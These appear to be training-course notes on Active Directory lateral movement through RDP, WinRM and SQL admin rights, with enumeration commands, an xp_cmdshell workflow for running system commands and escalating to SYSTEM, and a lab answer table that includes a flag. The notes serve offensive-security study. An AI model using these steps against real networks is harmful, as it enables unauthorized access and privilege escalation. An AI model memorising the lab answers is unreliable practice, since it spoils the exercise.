# NOTE template — hands-on section (has commands)

## ID
530

## Module
Active Directory Enumeration & Attacks

## Kind
notes

## Title
Section 23 — Privileged Access

## Description
Enumerates and exploits non-admin lateral movement paths (RDP, WinRM, SQLAdmin) using PowerView, BloodHound, Evil-WinRM, and mssqlclient.py to move between hosts in a domain.

## Tags
lateral-movement, rdp, winrm, sqladmin, bloodhound, evil-winrm

## Commands
- Get-NetLocalGroupMember -ComputerName <HOST> -GroupName "Remote Desktop Users"
- Get-NetLocalGroupMember -ComputerName <HOST> -GroupName "Remote Management Users"
- Enter-PSSession -ComputerName <HOST> -Credential $cred
- evil-winrm -i <IP> -u <USER>
- Get-SQLInstanceDomain
- Get-SQLQuery -Verbose -Instance "<IP>,1433" -username "<DOMAIN\USER>" -password "<PASS>" -query 'Select @@version'
- mssqlclient.py <DOMAIN>/<USER>@<IP> -windows-auth
- enable_xp_cmdshell
- xp_cmdshell <COMMAND>

## What This Section Covers
Lateral movement doesn't require local admin — RDP, WinRM, and SQLAdmin rights are often overlooked paths that let you pivot to new hosts. This section walks through enumerating those access rights with PowerView and BloodHound, then exploiting them from both Windows and Linux attack hosts. The SQLAdmin path is especially impactful because the SQL service account almost always holds SeImpersonatePrivilege, giving a direct route to SYSTEM.

## Methodology
1. Import BloodHound data and check if `Domain Users` has execution rights (CanRDP, CanPSRemote) on any hosts — this is the first thing to check after data import.
2. Enumerate RDP access: `Get-NetLocalGroupMember -ComputerName <HOST> -GroupName "Remote Desktop Users"` or use BloodHound queries `Find Workstations where Domain Users can RDP` / `Find Servers where Domain Users can RDP`.
3. Enumerate WinRM access: `Get-NetLocalGroupMember -ComputerName <HOST> -GroupName "Remote Management Users"` or run the custom Cypher query for CanPSRemote edges.
4. Connect via WinRM from Windows with `Enter-PSSession` or from Linux with `evil-winrm -i <IP> -u <USER>`.
5. Enumerate SQLAdmin edges in BloodHound using the custom Cypher query for SQLAdmin rights.
6. From Windows, use PowerUpSQL: `Get-SQLInstanceDomain` to discover instances, then `Get-SQLQuery` to run queries.
7. From Linux, use `mssqlclient.py <DOMAIN>/<USER>@<IP> -windows-auth` to connect.
8. Once authenticated to SQL, run `enable_xp_cmdshell` then `xp_cmdshell whoami /priv` to confirm SeImpersonatePrivilege for privilege escalation.

## Multi-step Workflow (optional)
```
# --- WinRM from Windows ---
$password = ConvertTo-SecureString "<PASS>" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("<DOMAIN>\<USER>", $password)
Enter-PSSession -ComputerName <HOST> -Credential $cred

# --- SQL exploitation from Linux ---
mssqlclient.py <DOMAIN>/<USER>@<IP> -windows-auth
enable_xp_cmdshell
xp_cmdshell whoami /priv
xp_cmdshell type C:\path\to\flag.txt
```

## Lab — Questions & Answers (optional)
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — What other user has CanPSRemote rights? | bdavis | `Get-DomainComputer \| ForEach { Get-NetLocalGroupMember -ComputerName $_.name -GroupName "Remote Management Users" }` |
| Q2 — What host can this user access via WinRM? | ACADEMY-EA-DC01 | Same enumeration — bdavis is in Remote Management Users on DC01 |
| Q3 — Flag at C:\Users\damundsen\Desktop\flag.txt | 1m_the_sQl_@dm1n_n0w! | mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth → enable_xp_cmdshell → xp_cmdshell type C:\Users\damundsen\Desktop\flag.txt |

## References
- **PowerUpSQL Cheat Sheet**: https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet
  - Key functions: `Get-SQLInstanceDomain` (discover AD SQL instances), `Get-SQLInstanceLocal` (local), `Get-SQLInstanceBroadcast` (UDP broadcast), `Get-SQLQuery` (run queries), `Get-SQLServerInfo` (server details), `Invoke-SQLAudit` (audit), `Invoke-SQLEscalatePriv` (priv esc), `Get-SQLServerLinkCrawl` (crawl linked servers)
  - Offensive TSQL templates: https://github.com/NetSPI/PowerUpSQL/tree/master/templates/tsql

## Key Takeaways
- Always check execution rights (CanRDP, CanPSRemote, SQLAdmin) after every new user compromise — not just local admin.
- Domain Users in the Remote Desktop Users group is a common misconfiguration that gives blanket RDP access.
- SQL sysadmin access almost always means SYSTEM via SeImpersonatePrivilege + xp_cmdshell + JuicyPotato/PrintSpoofer.
- BloodHound custom Cypher queries for CanPSRemote and SQLAdmin edges are not built-in — save them as custom queries for reuse.
- Credential sources for SQL: Kerberoasting, LLMNR/NBT-NS poisoning, password spraying, Snaffler (web.config files).
- Full PowerUpSQL cheat sheet at https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet — bookmark it.

## Gotchas (optional)
- Evil-WinRM needs the target to have WinRM enabled (port 5985/5986) — firewalls may block it even if the user has rights.
- PowerUpSQL must be imported before use: `Import-Module .\PowerUpSQL.ps1`.
- mssqlclient.py requires the `-windows-auth` flag for domain authentication — without it, it attempts SQL auth and fails.


<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|ad-enum-attacks]]  
← [[22-dcsync]] | [[24-winrm-double-hop-kerberos]] →
<!-- AUTO-LINKS-END -->
